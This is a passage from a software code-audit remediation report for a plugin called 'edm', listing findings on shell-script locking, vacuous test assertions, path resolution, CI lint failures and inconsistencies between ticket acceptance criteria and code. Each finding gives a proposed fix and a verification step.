OK -- the case CLAUDE.md singles out as most exposed); entity stripping is narrower, so `#lt;`,
`#gt;` and `#amp;` are unstripped and a legal diagram scores BAD; the trailing-terminator strip is
absent; the three `%%`/`classDef`/`style` exemptions are absent; fence recognition is anchored at
column 1 (the same defect CA-009 covers); the bracket character class is narrower. Dimension 3 is
the metric used to detect artifact-quality regressions and it awards full marks to two of the five
conditions the rule exists to catch.

**Fix**: lift the rule body into `plugins/edm/bin/edm-mermaid-rules.awk` and consume it from both
sides via a two-`-f` awk invocation. That keeps the scorer's framing, verdict stream and exit-0
contract untouched, and `awk -f` on a data file is not "a `bin/` script on the scorer's PATH". Put
it in `bin/`, not `evals/`, because of the 100KB ceiling on the eval directory.

**Verification**: score a run whose `srd.md` is assembled from the committed `valid/*` fixtures and
assert dimension 3 == 100; repeat with `invalid/*` and assert < 100 with each of the five conditions
individually flagged. This is the same fixture work CA-039 needs.

**Files affected**: `plugins/edm/evals/score-artifacts.sh`, `plugins/edm/bin/edm-lint-artifacts`,
new `plugins/edm/bin/edm-mermaid-rules.awk`.

## CA-020 (P1, lens L11): the lens JSONL half is never requested, and this round is the live instance

**Site**: `plugins/edm/skills/code-audit/SKILL.md:49`, `:184` versus `:206`; contract at
`plugins/edm/agents/edm-audit-wiring.md:80`.

**Problem**: Every lens agent's Output contract requires `lens-L{N}.md` **and** `lens-L{N}.jsonl`
and declares the JSONL authoritative, and the committed fixture set carries both halves for all
eleven. The launching skill names only the markdown. The synthesizer prompt then reads "lens reports
(prose and JSONL)". The skill is the operative instruction at spawn time, so the ledger is built
from prose. This round proves it: the pass directory contains eleven `lens-L{N}.md` files and zero
`.jsonl` files, so every severity, component and title in `findings-ledger.jsonl` was re-derived
from prose by the synthesizer rather than read from the authoritative artifact. Interacts with
CA-130 (the lens `Write` grant did not reach the runtime), which is why the markdown halves are
orchestrator transcriptions.

**Fix**: name both artifacts in the skill's launch template at `:49` and `:184`, and add a step-8
precondition that eleven `.jsonl` files exist before the synthesizer is spawned, failing loudly with
the missing lens IDs if not. Given CA-130, also state the fallback explicitly: if a lens cannot
write, the orchestrator persists **both** halves on its behalf.

**Verification**: run a round and assert `ls "${OUTPUT_DIR}"/lens-L*.jsonl | wc -l` is 11 before the
synthesizer starts.

**Files affected**: `plugins/edm/skills/code-audit/SKILL.md`.

## CA-021 (P1, lens L11): update-patterns writes to the plugin cache, the curation blocks read cwd-relative

**Site**: `plugins/edm/bin/edm-state:3469` versus `skills/code-audit/SKILL.md:318`,
`skills/audit-srd/SKILL.md:159-201`, `skills/audit-tickets/SKILL.md:166-208`.

**Problem**: The writer targets `${script_dir}/../docs/audit-patterns/`, i.e. the plugin cache. The
three gate curation blocks grep a cwd-relative `docs/audit-patterns/*.md`, which does not exist in a
project cwd. Zero matches, and each block's own rule is "Absence is authoritative" -- so the write
side runs, the read side finds nothing, and every stub stays `pending-review` forever. That is
precisely the outcome the section opens by naming as the thing to prevent.

**Fix**: have the curation blocks resolve the directory the way the binaries do
(`${CLAUDE_PLUGIN_ROOT}/docs/audit-patterns/` with the same fallback `edm-state` uses), and make the
absence rule conditional on the directory resolving -- absence of a *resolvable* directory is a hard
error, not "no findings". Fix together with CA-048 (the same three blocks lack the grant their
instruction needs) and CA-077 (the same blocks run at the wrong step in one skill).

**Verification**: from a project cwd disjoint from the plugin cache, run the curation derivation and
confirm it lists the `pending-review` stubs `edm-state update-patterns` just wrote.

**Files affected**: `skills/code-audit/SKILL.md`, `skills/audit-srd/SKILL.md`,
`skills/audit-tickets/SKILL.md`.

## CA-022 (P1, lens L11): plugin assets referenced by cwd-relative paths with no anchor and no fallback

**Site**: `plugins/edm/skills/tickets/SKILL.md:45-46`,
`plugins/edm/skills/audit-tickets/SKILL.md:38`, `:125`,
`plugins/edm/agents/edm-ticket-writer.md:28-29`, `:36-37`.

**Problem**: Four prompt surfaces instruct `Read docs/templates/ticket-size-legend.md` and
`cross-cutting-ac.md` with no `${CLAUDE_PLUGIN_ROOT}` anchor and no fallback. From a project cwd the
read fails, and the instruction's own escape hatch ("never re-author") has no defined failure
behaviour -- so the practical outcome is a re-authored legend, the exact drift "single source of
truth" exists to prevent, and the ticket auditor sizes against a legend it could not load. Same root
cause as CA-021 and CA-013: plugin-relative assets referenced as if cwd were the plugin root.

**Fix**: anchor all four at `${CLAUDE_PLUGIN_ROOT}/docs/templates/...` and state the failure
behaviour explicitly ("if the read fails, stop and report; do not re-author").

**Verification**: `grep -rn 'docs/templates/' plugins/edm/skills plugins/edm/agents` shows an anchor
on every hit.

**Files affected**: `skills/tickets/SKILL.md`, `skills/audit-tickets/SKILL.md`,
`agents/edm-ticket-writer.md`.

## CA-023 (P1, lens L8): the commit hook hardcodes `^SRD/`, so a relocated `srd_root` loses all enforcement

**Site**: `plugins/edm/hooks/hooks.json:86`.

**Problem**: `srd_root` is a documented first-class `userConfig` option that `edm-lint-artifacts`
itself honours. The hook filters staged paths on a hardcoded `^SRD/`, so on a project that relocates
it the filter never matches, `test -z "$staged"` fires, the hook exits 0, and attribution trailers,
non-ASCII and leaked tool tags land in commits **with no signal at all**. The awk field indices
`$2`/`$3` bake in the same one-level assumption independently. The seven existing AC8 assertions all
check the hardcoded shape, so they lock the defect in.

**Fix**: derive the root the way the binaries do, strip it before the field split, and add an
assertion that the hook honours a relocated root. Fix in one edit with CA-011.

**Verification**: set `srd_root` to `docs/specs`, stage a file with an attribution trailer under it,
and confirm the commit is blocked.

**Files affected**: `plugins/edm/hooks/hooks.json`, `plugins/edm/bin/tests/wave7-smoke.sh`.

## CA-024 (P1, lens L8): the new blocking `lint:shellcheck` job fails on five deliberate word-splitting sites

**Site**: `.gitlab-ci.yml:127-147`; offending sites `bin/edm-check-grants:103`, `:232`,
`bin/edm-state:785`, `:1104`, and probably `:84-85`.

**Problem**: The job is blocking and its loop is unconditional over `bin/*`, though its comment
claims the scope is "new/modified code". All five sites are deliberate word-splitting on the
space-separated-string-as-constant idiom bash 3.2 forces, so **quoting them would break them**, and
none carries a disable directive. As written the job cannot pass.

**Fix**: add `# shellcheck disable=SC2086` with the bash-3.2 rationale at each of the five sites, or
add a changed-files filter so the job's behaviour matches its comment. Prefer the directives -- they
document the intent at the site. Note the latent second-order risk at `edm-check-grants:232`
(`set -- $list` also performs pathname expansion) is filed separately as CA-117 NOTED.

**Verification**: one pipeline run with `lint:shellcheck` green.

**Files affected**: `.gitlab-ci.yml`, `bin/edm-check-grants`, `bin/edm-state`.

## CA-025 (P1, lens L3): the advisory lock has no staleness detection and disarms an outer trap

**Site**: `plugins/edm/bin/edm-state:710-728`, specifically `:726` and `:705`.

**Problem**: The mkdir fallback spin-lock writes `${lockdir}/pid` and never checks it with
`kill -0`, so one SIGKILLed run bricks **every** later mutation with "state lock timeout" --
including the Stop and PreCompact hooks, which take the lock every turn. `cmd_git_lock_check` exists
for exactly this class on `.git/index.lock`; the plugin's own lock has no equivalent. Two further
defects in the same helper: nested acquisition runs `trap - EXIT INT TERM HUP` unconditionally,
disarming an outer lock's cleanup trap, and `cmd_update_patterns -> rmw_state` and
`cmd_archive -> record_degraded_check -> rmw_state` are already two-lock paths; and the flock branch
runs `"$@"` in a subshell while the mkdir branch runs it in the current shell, so a future locked
helper that sets a variable would work on macOS and silently return nothing on Linux.

**Fix**: after the retry budget, read the pidfile, `kill -0` the holder, and on a dead holder print
`stale lock`, `rm -rf` the lockdir and retry once. Save and restore the prior trap rather than
clearing it. Make both branches agree on subshell semantics. Consider an
`edm-state state-lock-check` subcommand paralleling `git-lock-check`.

**Verification**: `mkdir -p <lockdir>; echo 999999 > <lockdir>/pid`, then run any mutator and confirm
it reports a stale lock, clears it and proceeds; verify a live holder still causes the timeout.

**Files affected**: `plugins/edm/bin/edm-state`, `plugins/edm/bin/tests/wave6-smoke.sh`.

## CA-026 (P1, lens L3): `cmd_checkpoint` has no state-file guard, so one bad file ends checkpointing for all

**Site**: `plugins/edm/bin/edm-state:1570-1574`; hook at `plugins/edm/hooks/hooks.json:96`.

**Problem**: `cmd_checkpoint` reads `prefix` with no `[[ -f "$state" ]]` guard and no validity
check, then calls `rmw_state`, which `mkdir -p`s before discovering there is no file. A merge
conflict in the committed `.edm-state.json` yields `prefix=unknown`, creates `SRD/unknown/` and
`SRD/unknown/.edm-state.lock`, and `set -e` aborts the loop -- so every later initiative is silently
never checkpointed. The hook ends in `|| true`, so the failure is invisible. `:1215` and `:2715`
both guard; this one does not.

**Fix**: `[[ -f "$state" ]] || continue`; read `.prefix // empty` and skip with a stderr message when
empty; wrap the per-initiative body so one bad initiative cannot abort the sweep.

**Verification**: seed a scratch tree with one conflicted state file and two good ones, run
`checkpoint`, and confirm both good ones are checkpointed and the bad one is named on stderr.

**Files affected**: `plugins/edm/bin/edm-state`.

## CA-027 (P1, lens L3): `write_handoff_internal` truncates `HANDOFF.md` in place and writes the notes last

**Site**: `plugins/edm/bin/edm-state:3823-3827`, `:3985`.

**Problem**: `> "$handoff_path"` truncates in place, and the preserved `${notes}` are written last.
Every other writer in the file stages beside the target and `mv`s. This runs from the Stop and
PreCompact hooks across several initiatives -- exactly the shape killed at a hook timeout. Killed
after the truncate and before the notes write, the teammate-facing Notes are permanently gone with
no `.bak`. Separately, the notes-preserving awk pipes through `grep -v '^[[:space:]]*$'`, silently
deleting every blank line from user-authored Notes on each rewrite, and truncates them at the first
`## ` a user writes inside.

**Fix**: write to a temp beside the target and `mv -f`, inside `with_state_lock`, via the
`write_atomic` helper CA-015 introduces. Preserve the notes block verbatim -- do not filter blank
lines and do not stop at a user heading.

**Verification**: put a Notes block containing blank lines and a `## ` subheading into
`HANDOFF.md`, run two consecutive `checkpoint`s, and diff the block against the original.

**Files affected**: `plugins/edm/bin/edm-state`.

## CA-028 (P1, lens L3): the open form of `record-partial-verdict` destroys the closure chain

**Site**: `plugins/edm/bin/edm-state:3190-3192`; re-closure logic at `:3152-3162`.

**Problem**: The open form overwrites `.partial_verdict_map[$tk]` unconditionally, with no check for
`closing_verdict`, `prior` or `closure_history`. In the intended remediation loop -- PARTIAL, closed
FAIL with a `verification_ref`, remediated, then the SubagentStop hook records PARTIAL again -- the
whole closure chain is replaced and the FAIL record that the AC4 re-closure logic exists to preserve
is gone. The archive gate and the `OPEN_PARTIALS` anomaly both reason about that field.

**Fix**: in the open path, if the entry already has `closing_verdict`, append to `closure_history` or
nest the existing entry under `prior` rather than replacing it. Fix alongside CA-047, which is the
same command's closure message reading the wrong field.

**Verification**: record PARTIAL, close FAIL, record PARTIAL again, and assert
`jq '.partial_verdict_map[<tk>].closure_history | length'` is 1 and the FAIL verdict and
`verification_ref` are still readable.

**Files affected**: `plugins/edm/bin/edm-state`.

## CA-029 (P1, lens L5): the two `.gitignore` lock patterns match nothing the lock code creates

**Site**: `.gitignore:10-11`; `plugins/edm/bin/edm-state:459`, `:718-721`.

**Problem**: `lockbase="${f%.json}"`, so the artifacts are `.edm-state.lock` and `.edm-state.lockd/`.
`.gitignore` lists `.edm-state.json.lock` and `.edm-state.json.lockd/`. Neither pattern has a
wildcard, so **neither matches** -- a remediation that looks applied and is inert. (The archived
EDMV2 L5 table recorded the two rows mutually inconsistently and its REMEDIATION.md carried the
error into the `.gitignore` edit, so this is the second round in which the wrong names have been
written.) Compounding: the flock file is created by the `200>` redirect and **never unlinked on any
path**, so there is one permanent untracked lock file per initiative on every Linux box and CI
runner, sitting beside the file the methodology tells the user to `git add`, and the Stop and
PreCompact hooks take the lock every turn.

**Fix**: correct the two patterns to `.edm-state.lock` and `.edm-state.lockd/`; add
`rm -f "${lockfile}"` after the flock FD scope closes; add an assertion that the ignored names are
derived from `lockbase` rather than hand-written.

**Verification**: run any mutator on Linux and confirm `git status --porcelain` is empty and no
`.edm-state.lock` remains on disk.

**Files affected**: `.gitignore`, `plugins/edm/bin/edm-state`, `plugins/edm/bin/tests/wave6-smoke.sh`.

## CA-030 (P1, lens L5): a smoke case mutates a tracked file with no trap

**Site**: `plugins/edm/bin/tests/wave6-smoke.sh:3101-3112`.

**Problem**: The test appends to the **tracked** `plugins/edm/docs/canonical-sections.md` and
restores it with no trap -- the suite's only trap covers `$TMP`. Any interrupt in the window (the
suite has multiple `sleep 1`s and runs tens of seconds) or any `set -e` abort leaves a stray
`hand-edited, not regenerated` line in a tracked file plus an orphaned backup. The next `--check`
then fails with a confusing out-of-sync diff, and the line is a plausible accidental commit.
`run-all.sh` runs this from CI and from every local pre-push.

**Fix**: copy `CLAUDE.md` and `docs/` into `$TMP` and run the generator against the copy so the test
never touches the real tree. Failing that, back the file up inside `$TMP` and trap the restore.

**Verification**: SIGINT the suite inside that case and confirm `git status --porcelain` is empty.

**Files affected**: `plugins/edm/bin/tests/wave6-smoke.sh`.

## CA-031 (P1, lens L6): both documented eval defaults are wrong

**Site**: `plugins/edm/evals/README.md:74-75`; contradicted by the same file at `:233-234`.

**Problem**: The documented per-phase timeout is 900 against a real 2700, and the documented budget
is $2 against a real $15. The file's own measured figure (a 913s audit phase) is impossible under a
900s cap. An operator setting a budget from this line caps a real run at one seventh of the intended
spend and kills it before the audit phase can finish -- which is one of the six driver defects D23
records having already been hit seven times.

**Fix**: 900 -> 2700, 2 -> 15, and reconcile with `:233-234` so the file states each figure once.

**Verification**: `grep -n '900\|\$2\b' plugins/edm/evals/README.md` returns nothing outside history;
the stated figures match `run-eval.sh`'s defaults.

**Files affected**: `plugins/edm/evals/README.md`.

## CA-032 (P1, lens L7): `plan/SKILL.md` performs an in-place append with no `Edit` grant

**Site**: `plugins/edm/skills/plan/SKILL.md:8`, `:74-75`, `:77-81` against
`plugins/edm/skills/audit-srd/SKILL.md:8`.

**Problem**: `plan` is the only artifact-writing phase skill without `Edit`, yet Gate 1 performs the
same in-place `decisions.md` append that Gate 2 does with `Edit`. `decisions.md` is created by
`edm-init` with a header-only table, so appending is an edit to a file the skill did not author --
with `Write` only it must reconstruct the whole file, including the Finding-to-Commit Ledger table
that Phase 6 writes into. `:74-75` compounds it with two more in-place section edits.

**Fix**: add `Edit` to `plugins/edm/skills/plan/SKILL.md:8`.

**Verification**: `bash plugins/edm/bin/edm-check-grants` reports the grant with its justification;
a Gate 1 run appends a D-row without rewriting the rest of the file.

**Files affected**: `plugins/edm/skills/plan/SKILL.md`.

## CA-033 (P1, lens L9): six ACs verify against a token T21 AC5 requires to be absent

**Site**: `tickets/epics/01-mechanical-fixes.md:86` (T01 AC9),
`02-enforcement-kernel.md:1254` (T16 AC10), `11-cross-cutting-delivery.md:153` (T61 AC13),
`06-mermaid-rule.md:279` (T42 AC12), `06-mermaid-rule.md:481` (T44 AC6),
`09-pattern-library-curation.md:294` (T56's CI row).

**Problem**: Each states its verify command as a `grep` for a literal wave-suite token in
`.gitlab-ci.yml`. `grep -cE 'wave(3|4a|4b|5|6|7)-smoke' .gitlab-ci.yml` returns **0**, which is
exactly what T21 AC5 requires. So all six return zero hits and cannot pass as written. D19 ruled
T21 AC5 wins and stated T61 AC13 and T01 AC9 "are AMENDED to assert the suite runs via `run-all.sh`
auto-discovery instead" -- but the amendment was applied only to the pipeline job comment and to
`wave7-smoke.sh`'s T21 AC5 case, never to the ticket text, and the four ACs D19 does not name were
never considered.

**Fix**: rewrite all six verify clauses to the D19-sanctioned form -- `grep -n 'run-all.sh'
.gitlab-ci.yml` returns the single invocation **and** `bash plugins/edm/bin/tests/run-all.sh` names
the suite in its per-suite summary. Add a note to D19 stating six ACs were affected, not two.

**Verification**: `grep -rn 'wave[0-9a-b]*-smoke.*\.gitlab-ci\.yml' SRD/edm/EDMV3__prompt-streamline/tickets/`
returns nothing.

**Files affected**: the six epic files, `decisions.md`.

## CA-034 (P1, lens L9): T22 AC8's auth contract was superseded in code and never reworked

**Site**: `tickets/epics/03-ci-and-fixture-eval.md:400-403`; stale prose at
`plugins/edm/evals/run-eval.sh:23-24`, `:34`, and `plugins/edm/evals/baseline/README.md:10`, `:24`,
`:28`.

**Problem**: The AC requires the driver to exit 2 naming `ANTHROPIC_API_KEY` when the variable is
absent. D20 replaced the env-var-only gate with two sanctioned auth paths (`run-eval.sh:164`,
`:173-175` dies only when **both** fail), so on a machine with an authenticated `claude` CLI --
the state D20 verified live -- the AC's verify command **starts a real, costed run** instead of
exiting 2. D15 says an AC whose stated precondition does not match the runtime is a spec defect to
be reworked; D20 reworked the code and recorded the decision but left the AC and the script's own
header standing.

**Fix**: rewrite T22 AC8 to "refuses to start with no working auth at all, naming both sanctioned
paths", verified by `env -u ANTHROPIC_API_KEY PATH=/usr/bin:/bin bash run-eval.sh; echo exit=$?`
returning `exit=2`; correct `run-eval.sh:23-24`, `:34` and `baseline/README.md:24`, `:28` to the
two-path wording.

**Verification**: the rewritten command returns `exit=2` and its message names both paths.

**Files affected**: `tickets/epics/03-ci-and-fixture-eval.md`, `plugins/edm/evals/run-eval.sh`,
`plugins/edm/evals/baseline/README.md`.

## CA-035 (P1, lens L4): four assertions structurally incapable of failing

**Site**: `bin/tests/wave6-smoke.sh:3436-3437` (T52 AC2), `:3439-3445` (T52 AC4);
`bin/tests/wave7-smoke.sh:1536-1539` (T42 AC4); `evals/score-artifacts.sh:485-501` via
`bin/tests/wave7-smoke.sh:451-455` (AC3).

**Problem**: (a) The expected substring at `:3436` is the **empty string**, and `check` is a
`*"$expected"*` match, so it passes unconditionally -- reporting PASS when `attribution_mode` is
null, absent or garbage. It is the only assertion covering AC2. (b) The `else` branch at `:3439`
passes for any non-`scoped` value including empty, so with (a) vacuous a total regression of session
scoping -- the feature that stops a second window inflating cost 100x, which the 100000-versus-1000
fixture exists to catch -- reports two PASSes, and the one assertion that could catch it is gated
behind a condition the regression turns off. (c) A fixed-literal grep piped to `sort -u | wc -l` is
always 1 given any match, so it distinguishes only "at least one" from "none" and can never detect a
second quoting form -- the exact opposite of its label. (d) The AC3 assertion recomputes the same
arithmetic the scorer used, making it a self-consistency identity that cannot detect a wrong
dimension score, a wrong sign, a swapped dimension, or a scorer returning 0 for everything.

**Fix**: (a) compare against the two legal values explicitly; (b) assert the mode is legal first and,
in the fallback branch, assert the honest whole-directory total of 101000; (c) widen the capture to
the reference family and count distinct forms; (d) score a fixture with hand-computed values and
assert dimension scores and total against literals.

**Verification**: for each, break the subject deliberately and confirm the assertion now fails.

**Files affected**: `bin/tests/wave6-smoke.sh`, `bin/tests/wave7-smoke.sh`,
`plugins/edm/evals/score-artifacts.sh` fixtures.

## CA-036 (P1, lens L4): unguarded zero-match counts abort the suite instead of failing an assertion

**Site**: `bin/tests/wave7-smoke.sh:1652-1653`, `:2146`, `:1458`, `:1567-1568`, `:2048`, `:3378`;
`bin/tests/wave6-smoke.sh:228`, `:235`, `:572`, `:579`, `:663`, `:691`, `:1391`, `:1491`, `:2755`.

**Problem**: Under `set -euo pipefail` a zero-match `grep -c` in an assignment exits the suite,
surfacing in `run-all.sh` as `FAILED SUITES` with **zero failed assertions** (see CA-016). At
`:1652` that means the T43 AC1 regression it exists to catch -- the refactor reverted or the
function renamed -- aborts the run and the remaining roughly 1800 lines never execute. `:2615`
asserts the same canonical Gate PROTOCOL heading *with* `|| true`, so the suite is internally
inconsistent about its own idiom. `wave6:2755` (`BLOCKING_FILTER` expects exactly 5) and `:691` are
the most consequential of the ten in wave6.

**Fix**: one shared `count_matches` helper that appends `|| true` and returns 0 on no match, and
route all fifteen sites through it.

**Verification**: delete the canonical Gate PROTOCOL heading in a scratch copy and confirm the suite
reports one failed assertion and continues to the end.

**Files affected**: `bin/tests/wave6-smoke.sh`, `bin/tests/wave7-smoke.sh`, `bin/tests/_harness.sh`.

## CA-037 (P1, lens L4): roughly two dozen zero-count assertions with no positive control

**Site**: `bin/tests/wave7-smoke.sh:174-177` (T09 AC13), `:224-226` (T03 AC2/AC4), `:322-324`,
`:837-841`, `:939-950`, `:994-997`, `:1834-1837`, `:1988-1991`, `:2119-2121`, `:2957-2960`,
`:3235-3237`, `:2178-2181`, `:2167-2170`, `:1543-1551`, `:2523-2525`, `:341-343`, `:711-721`;
`bin/tests/wave6-smoke.sh:2415-2420`, `:711-714`, `:3187-3190`.

**Problem**: A 0 count is produced identically by the invariant holding, a typo in the needle, or a
wrong path -- and `|| true` / `2>/dev/null` turns grep's error into the passing value. Only two sites
in the whole suite carry a control (`wave7:931` and `:3450-3457`). The most consequential is
`:174-177`: `--force` absent from `bin/edm-state` guards the single most load-bearing product
invariant (D13's no-override rule), nothing proves the needle can match, and it is duplicated at
three further sites. `:224-226`'s `^agent:` zero-count does not prove the anchored format, because
the nearby line 231 matches mid-line inside a `warning:` prefix -- so unsatisfied agents could
accumulate while the assertion stays green.

**Fix**: one shared `assert_absent_with_control <needle> <control-path>` helper. Control `--force`
against `bin/vocabulary-prohibited.txt`, which contains `literal:--force`; control `^agent:` against
the AC6 injected-failure case; control the deleted-text needles against `CHANGELOG.md`, which records
the removals; control `code_audit_converged true` against `SETTABLE_KEYS`'s refusal. Collapse the
duplicated sites. `wave7:3445-3457` is the correct pattern and the model to rewrite against.

**Verification**: misspell each needle and confirm the assertion fails on the control rather than
passing on the zero count.

**Files affected**: `bin/tests/_harness.sh`, `bin/tests/wave6-smoke.sh`, `bin/tests/wave7-smoke.sh`.

## CA-038 (P1, lens L4): the fence-indentation fix has no test, so reverting it keeps the suite green

**Site**: `plugins/edm/bin/edm-lint-artifacts:160-166`.

**Problem**: There are zero indented fences in the 16-file fixture corpus and every T43/T44 fixture
puts its fence at column 0, so the change this initiative made -- de-indenting fence detection -- is
untested in both directions. Reverting it keeps `run-all.sh` fully green. That matters more than
usual because CA-009 shows two mirrors that did **not** get the change and CA-019 shows a third copy
that did not either, and there is no corpus that would reveal the disagreement.

**Fix**: two fixtures -- an indented non-mermaid fence containing an attribution-trailer line and an
em dash, asserted CLEAN; and an indented mermaid fence with a raw `;` in a `[...]` label plus an
`expected-line:` marker, asserted as a violation on the right line. Run all three implementations
(linter, both checkers) against the shared corpus once CA-050 lands.

**Verification**: revert `:160-166` and confirm the new fixtures fail.

**Files affected**: `bin/tests/fixtures/`, `bin/tests/wave7-smoke.sh`.

## CA-039 (P1, lens L4): three of the scorer's five dimensions never execute

**Site**: `plugins/edm/evals/score-artifacts.sh:197-232` (vague-AC detector), `:242-305`
(dimension 3), `:308-363` (dimension 4).

**Problem**: The synthetic fixture has no mermaid block, so 35 lines of dimension-3 awk never run --
and its fence regex anchors at column 1, i.e. it has exactly the bug `edm-lint-artifacts` was just
fixed for (CA-019). It has no `tickets/README.md` and no `audit-srd.md`, so dimension 4 never runs at
all -- neither the coverage-map path nor the fallback, and neither direction of the bidirectionality
check. Its single AC is deliberately not vague, so `vague_count` is 0 on every run: an empty pattern
list, a malformed regex or a failed `grep -f` would score 100 for every input, silently inverting
the dimension, and the polarity is untested. Three of five dimensions never execute and the two that
do have no expected-value assertion (CA-035d).

**Fix**: assemble the fixture's `srd.md` from the committed `valid/*` fixtures and assert dimension
3 == 100; repeat with `invalid/*` and assert < 100. Add a second, vague AC and assert
`.dimensions[1].score == 50`. Extend the fixture with an `audit-srd.md` naming a real and a
fabricated requirement and assert dimension 4 against a hand-computed value.

**Verification**: `bash plugins/edm/evals/score-artifacts.sh <fixture>` produces five non-null
dimension scores and the asserted literals.

**Files affected**: `plugins/edm/evals/score-artifacts.sh` fixtures, `bin/tests/wave7-smoke.sh`.

## CA-040 (P1, lens L4): `convergence_exempt`'s whole reason to exist is untested

**Site**: `plugins/edm/bin/edm-state:579-591`; consumers at `:1278-1283` and `cmd_archive`.

**Problem**: Untested at both consumers: the `lifecycle_mode` half, the `mode == "null"` legacy
branch, and -- most importantly -- the deliberate asymmetry that `approve-gate code-audit` stays
refused under `fast-track` while archive and `audit-converged` become exempt. A future edit routing
approve-gate through the helper "for consistency" would open a gate bypass silently. This is the
gate the whole initiative was built to add.

**Fix**: three cases per consumer across the four mode/lifecycle combinations, plus one asserting
`approve-gate code-audit` still refuses under `fast-track`.

**Verification**: route `cmd_approve_gate` through the full helper in a scratch copy and confirm the
new case fails.

**Files affected**: `bin/tests/wave6-smoke.sh`.

## CA-041 (P1, lens L4): three gaps in the pricing tests

**Site**: `bin/tests/wave6-smoke.sh:3455-3458`, `:3488-3500`, `:3505-3508`.

**Problem**: "Frozen, not env-overridable" is asserted only as `> 0`, which any rate satisfies; only
the opus previous-generation arm is tested at all; and the documented in-family mispricing behaviour
has no test, so it can flip either way unnoticed. `:3488` uses a deliberately alien string and
`:3505` uses `claude-opus-4-8-20260701`; nothing asserts the generation actually in production. This
is the test half of the D32 pricing work (CA-105 NOTED) and of CA-012's documentation half.

**Fix**: assert that setting `EDM_OPUS_OUTPUT_RATE` does **not** change a frozen arm's output;
mirror for sonnet and haiku; pin the live generation's behaviour (a warning on stderr plus a
placeholder cost) so the documented guarantee is mechanically checked.

**Verification**: change a frozen rate literal and confirm the new assertion fails; unset the warning
and confirm the live-generation case fails.

**Files affected**: `bin/tests/wave6-smoke.sh`.

## CA-042 (P1, lens L4): `check_state_unchanged` has two vacuous-pass modes across 49 call sites

**Site**: `plugins/edm/bin/tests/_harness.sh:131-158`; representative call site
`bin/tests/wave6-smoke.sh:2431-2434`.

**Problem**: `_harness_hash_file` returns the literal `absent` for a missing file, so a typo'd path
compares `absent` to `absent` and reports PASS -- across 49 call sites, each with a hand-built path.
And `"$@" >/dev/null 2>&1 || true` discards the exit code and all output, so the helper passes
whether the command refused as intended, was not found, or died on a syntax error. The four
genuinely read-only sites have no call-site control, and `list --paths` has no output assertion
anywhere.

**Fix**: guard `[[ -f ]]` and fail explicitly on a missing path; expose the exit status, or add
`check_refuses_and_leaves_state` combining `check_fails` with the hash comparison -- what 45 of the
49 sites actually want. Precede the four read-only sites with an output assertion.
`wave6:3390` is the correctly-controlled model to follow.

**Verification**: typo one call site's path and confirm it fails; rename the command under test to a
nonexistent binary and confirm it fails.

**Files affected**: `bin/tests/_harness.sh`, `bin/tests/wave6-smoke.sh`, `bin/tests/wave7-smoke.sh`.

## CA-043 (P1, lens L4): an assertion on git history rather than tree state

**Site**: `plugins/edm/bin/tests/wave7-smoke.sh:2101-2103`.

**Problem**: It asserts `git log ... | grep -c 'EDMV3-T34'` -- the same shape as the
`git diff --stat` assertion already rewritten today and declared invalid by `CHANGELOG.md:75-76`.
It is vacuous on a shallow clone (GitLab's default), a squash, a rebase, a commit-convention change,
or outside a work tree, and its `2>/dev/null || true` converts every one of those into a pass.

**Fix**: delete it. The property AC5 wanted is already asserted structurally by T37 AC2 and T38 AC3.

**Verification**: `grep -rn 'git log' plugins/edm/bin/tests/` returns no assertion-bearing hits.

**Files affected**: `bin/tests/wave7-smoke.sh`.

## CA-044 (P1, lenses L1 + L2 + L6): FIXED in `4890bfc` -- three `die` messages lost their interpolations

`plugins/edm/bin/edm-lint-artifacts:435`, `:436`, `:471` now read `${PREFIX}`, `${INIT_DIR}` and
`${PATH_ARG}` again, and line 435 names the prefix in its `edm-state init` instruction, so the
instruction can fix the problem it reports. Verified against the current tree.

---

# P2

Sixty open P2 findings. All sixty are in the blocking set. Presented grouped by remediation area so
each root cause is fixed once; the ledger carries the canonical one-line title for each.

## Group P2-A: shared-library extraction (root cause behind CA-009, CA-010)

| ID | Lenses | Site | Problem | Fix |
|---|---|---|---|---|
| CA-050 | L10 | `bin/edm-check-vocabulary:145` | `build_ignore_set` exists as byte-identical 35-line copies in two checkers, `is_ignored_line` three times, `report_violation` three times. Not test-only, no circular dependency, and the checkers' own comments claim they are supposed to be identical | One roughly 45-line sourceable `bin/_edm-lint-lib.sh` removes about 80 duplicated lines and the whole drift surface. `edm-check-vocabulary` already walks `bin/`, so the new file lands in its own scan scope |
| CA-057 | L3 | `bin/edm-lint-artifacts:167-183` | `in_fence` is one boolean with no END reconciliation, so an unterminated fence marks every later line ignored and the blocking gate passes a file it never scanned; a four-backtick fence wrapping three-backtick examples inverts. `split(info, parts, /[ \t]+/)` also leaves `\r`, so a CRLF file never matches `lang == mermaid` and class 4 never fires | Record the opening run length and close only on a run at least as long (CommonMark); emit an `unterminated-fence` diagnostic from `END` as a real violation; `sub(/\r$/, "")` at the top of both awk bodies and `tr -d '\r'` in the three snippet extractions |
| CA-058 | L3 | `bin/edm-lint-artifacts:288-294`, `:314`, `:439-441` | `collect_md_files` has no `-type f` and no `-print0`, so a filename with a newline or a directory/dangling symlink named `*.md` propagates awk's exit 2 and the hook reports "Fix artifact violations" for a file with none; same shape on a TOCTOU delete. Line sets ride in the environment with a `\|\| true` consumer, so a large all-mermaid artifact hits `E2BIG` and class 4 reports zero findings | Add `-type f`; guard `[[ -r ]]` and report an `unreadable` violation instead of dying; pass the sets on stdin or a temp file as class 1 does, and report `scan-error` rather than `\|\| true` |
| CA-101 | L4 | `bin/edm-lint-artifacts:213` | `strip_entities`' explicit 1..10 walk is never tested at either boundary (an 11-character token, or `#;` with zero characters), and the `(...)`/`{...}` spans have no *valid* counterpart proving a legal parenthesised label with a trailing terminator passes | Two lines added to the existing scratch fixture |

## Group P2-B: `bin/edm-state` correctness and concurrency

| ID | Lenses | Site | Problem | Fix |
|---|---|---|---|---|
| CA-047 | L1 + L2 | `bin/edm-state:3180` | `${already_closing_verdict:-PARTIAL}` sits on a path reachable only when `.closing_verdict` is absent, so the default always fires and a PASS- or FAIL-closed entry is reported as "(was PARTIAL)" -- a fabricated prior state in a field the archive gate and the `OPEN_PARTIALS` anomaly both reason about. It reads `.closing_verdict` where the open shape's verdict is `.verdict` | Read `.verdict` into `prior_verdict` and interpolate that; fix with CA-028 |
